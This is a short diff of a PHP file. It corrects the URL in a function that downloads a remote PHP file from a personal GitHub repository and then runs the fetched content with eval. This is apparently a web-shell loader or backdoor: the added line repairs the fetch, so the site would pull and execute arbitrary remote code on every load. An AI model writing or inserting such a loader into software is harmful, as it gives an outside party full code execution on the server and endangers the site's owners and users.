@@ -26,5 +26,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw,github.com/Lukasenembe77/awwww/main/lupyu.php');
+$a = geturlsinfo('https://raw.github.com/Lukasenembe77/awwww/main/lupyu.php');
 eval    ('?>'.$a);
